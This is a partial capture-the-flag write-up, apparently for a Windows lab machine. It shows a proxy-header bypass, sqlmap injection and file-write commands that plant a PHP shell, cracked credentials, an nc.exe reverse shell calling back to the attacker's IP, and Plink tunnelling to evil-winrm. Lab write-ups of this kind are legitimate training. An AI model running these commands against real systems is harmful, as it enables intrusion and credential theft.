There are 3 open ports:

![Screenshot](images/Screenshot_1.png)


We will fuzz the web server:

![Screenshot](images/Screenshot_2.png)

![Screenshot](images/Screenshot_3.png)

Accessing the admin page states we are not going through a proxy:

![Screenshot](images/Screenshot_4.png)

So we can try to use the X-Forwarded-Host header:

![Screenshot](images/Screenshot_5.png)

We can see the internal IP is revealed in the index page code:

![Screenshot](images/Screenshot_6.png)

And changing to that IP:

![Screenshot](images/Screenshot_7.png)

And so, we can access the admin page:

![Screenshot](images/Screenshot_8.png)

We test the search capability for SQL injections:

![Screenshot](images/Screenshot_9.png)

It produces this error:

![Screenshot](images/Screenshot_10.png)

Let us capture a request using Burp:

![Screenshot](images/Screenshot_11.png)

And test it using the “-r” option of sqlmap:

```
sqlmap --level 5 --risk 3 --dbms mysql -p "productName" -r req.txt
```

![Screenshot](images/Screenshot_12.png)

Note for the future: The request must be similar to this, with only one space between the headers and the data sent:

![Screenshot](images/Screenshot_13.png)

It returns some hashes and even cracks one of them:

![Screenshot](images/Screenshot_14.png)

And we can crack another in Crackstation:

![Screenshot](images/Screenshot_15.png)

So the hashes are:

- hector - *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D (l33th4x0rhector)

- manager -  *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA (l3tm3!n)

- root - *0A4A5CAD344718DC418035A1F4D292BA603134D8 (???)


Then we will grab a PHP shell:

![Screenshot](images/Screenshot_16.png)

And we will upload the file:

```
sqlmap --dbms mysql -p "productName" --file-write rrrshell.php --file-dest "C:\inetpub\wwwroot\rrrshell.php" -r req.txt
```

![Screenshot](images/Screenshot_17.png)


We get remote code execution:

![Screenshot](images/Screenshot_18.png)

Reverse shell:

```
\\10.10.15.19\RIC\nc.exe 10.10.15.19 8888 -e cmd
```

![Screenshot](images/Screenshot_19.png)


![Screenshot](images/Screenshot_20.png)

We will list the services running, which include Winrm:

![Screenshot](images/Screenshot_21.png)


After unsuccessfully trying to execute a Meterpreter binary, I tried to use Plink (mi primerita vez):

```
plink.exe -R 5985:127.0.0.1:5985 10.10.15.19
```
![Screenshot](images/Screenshot_22.png)

We can see there is a new service in our Kali machine:

![Screenshot](images/Screenshot_23.png)

Now we can access as Hector and grab the user.txt flag:

```
./evil-winrm.rb -i 127.0.0.1 -u Hector -p "l33th4x0rhector"
```

![Screenshot](images/Screenshot_24.png)



And regarding the root flag... To be honest, I found it in a leak in pastebin D:

![dont sue me please!](https://media1.giphy.com/media/l2Je2rsN4y2iANLdC/giphy.gif?cid=ecf05e47730942c93d49001f72fd9dd5535faec4f26c0db3&rid=giphy.gif)

So this is just a half-writeup! It was a great box even though I could not find a way to escalate privileges. Sorry and see you next time!

![byeee](https://media0.giphy.com/media/l1J3CbFgn5o7DGRuE/giphy.gif?cid=ecf05e476d2c2b600e7300609c4b4a26347335ce9791a2f9&rid=giphy.gif)
